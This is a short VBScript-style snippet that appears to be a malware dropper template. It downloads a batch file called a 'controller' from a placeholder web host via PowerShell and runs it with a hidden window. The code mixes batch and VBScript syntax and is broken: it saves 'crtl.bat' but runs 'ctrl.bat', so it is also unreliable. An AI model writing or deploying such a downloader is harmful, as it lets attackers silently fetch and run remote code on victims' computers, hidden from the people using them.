Set WshShell = CreateObject("WScript.Shell")
CD temp
powershell -Command "Invoke-WebRequest https://YOUR_FILE_WEBSITE_THAT_HOSTS_CONTROLLER.BAT -OutFile crtl.bat"
WshShell.Run chr(34) & ctrl.bat & Chr(34), 0
Set WshShell = Nothing